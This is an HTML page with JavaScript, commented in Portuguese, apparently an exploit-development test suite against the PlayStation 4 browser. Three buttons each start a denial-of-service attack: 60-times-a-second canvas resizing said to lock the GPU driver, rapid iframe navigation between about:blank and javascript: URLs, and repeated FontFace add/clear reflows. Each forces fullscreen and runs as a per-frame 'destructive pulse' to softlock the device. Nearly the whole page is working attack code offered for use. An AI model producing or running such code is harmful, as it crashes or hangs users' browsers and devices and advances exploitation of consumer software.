<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v360000: The Flicker</title>
<style>
    body { background: #000; color: #f0f; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f0f; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #202; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #505; color: #fff; border: 2px solid #f0f;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f0f; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v360000: THE FLICKER</h1>

<div class="status">
    ESTRATÉGIA: SOFTLOCK + MEMORY THRASHING (ALOCA/LIBERA)<br>
    CLIQUE -> FULLSCREEN -> FECHE ALERTA
</div>

<button onclick="flicker(f01)">01. Canvas Resize Flicker (VRAM Thrash)</button>

<button onclick="flicker(f02)">02. Iframe Navigation Flicker</button>

<button onclick="flicker(f03)">03. FontFace Set Flicker</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // =================================================================
    // EXECUTOR FLICKER
    // =================================================================
    function flicker(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura o Alvo
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Timing
        requestAnimationFrame(() => {
            setTimeout(() => {
                // ALERTA
                window.alert("⚠️ THRASHING STARTED ⚠️\n\nAo fechar, iniciaremos o ciclo de destruição rápida.");

                // AQUI ACONTECE A MÁGICA
                
                // 1. Detonação Inicial (Limpa o DOM)
                if(target._detonate) target._detonate();
                
                // 2. Loop de Thrashing (O Pulso Destrutivo)
                if(target._flicker) {
                    let state = false;
                    function beat() {
                        // Alterna estado (Cria/Destroi) a cada frame
                        state = !state;
                        target._flicker(state);
                        
                        // Chama o próximo frame imediatamente
                        requestAnimationFrame(beat);
                    }
                    beat();
                }
                
            }, 50);
        });
    }

    // =================================================================
    // 01. Canvas Resize Flicker
    // Redimensionar um canvas força a GPU a destruir a textura antiga
    // e criar uma nova. Fazer isso 60x por segundo trava o driver.
    // =================================================================
    function f01(stage) {
        const d = document.createElement('div');
        d.innerText = "CANVAS FLICKER";
        stage.appendChild(d);

        // Cria 5 canvas grandes
        const canvases = [];
        for(let i=0; i<5; i++) {
            const c = document.createElement('canvas');
            c.width = 100; c.height = 100;
            document.body.appendChild(c);
            canvases.push(c);
        }

        d._detonate = () => {
            // Nuke no body visual, mas mantemos referência aos canvas
            document.open(); 
        };

        d._flicker = (state) => {
            // Se state for true, aloca 4K. Se false, zera memória.
            const size = state ? 2048 : 0; // 0 libera memória, 2048 aloca 16MB
            
            for(let i=0; i<canvases.length; i++) {
                // O redimensionamento destrói o buffer interno da GPU
                canvases[i].width = size;
                canvases[i].height = size;
                
                if(state) {
                    // Se alocado, força uma escrita para "sujar" a memória
                    const ctx = canvases[i].getContext('2d');
                    ctx.fillStyle = 'red';
                    ctx.fillRect(0,0,10,10);
                }
            }
        };
        return d;
    }

    // =================================================================
    // 02. Iframe Navigation Flicker
    // Navegar um iframe cria contextos de segurança e janelas.
    // Trocar isso rápido estressa o gerenciador de processos.
    // =================================================================
    function f02(stage) {
        const d = document.createElement('div');
        d.innerText = "IFRAME FLICKER";
        stage.appendChild(d);

        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);

        d._detonate = () => {
            // Oculta visualmente para não gastar tempo de render
            ifr.style.display = "none";
        };

        d._flicker = (state) => {
            // Alterna entre uma página vazia e um esquema inválido
            // Isso força o parser a iniciar e abortar repetidamente
            if (state) {
                ifr.src = "about:blank";
            } else {
                // javascript: cria um novo contexto de execução
                ifr.src = "javascript:1"; 
            }
        };
        return d;
    }

    // =================================================================
    // 03. FontFace Set Flicker
    // Adicionar e remover fontes força o navegador a recalcular o estilo
    // de todo o texto da página (Reflow Global).
    // =================================================================
    function f03(stage) {
        const d = document.createElement('div');
        d.innerText = "FONT FLICKER";
        stage.appendChild(d);
        
        // Cria um texto para sofrer o reflow
        const span = document.createElement('span');
        span.innerText = "CRASH ".repeat(100);
        document.body.appendChild(span);

        // Fonte falsa
        const f = new FontFace("Crash", "url(data:font/woff;base64,A)");

        d._detonate = () => {
            // Mantém o DOM vivo neste caso para forçar o recálculo
        };

        d._flicker = (state) => {
            if (state) {
                document.fonts.add(f);
                document.body.style.fontFamily = "Crash";
            } else {
                document.fonts.clear();
                document.body.style.fontFamily = "monospace";
            }
            // Acesso que força o layout engine a aplicar a mudança agora
            const trigger = document.body.offsetWidth;
        };
        return d;
    }

</script>
</body>
</html>
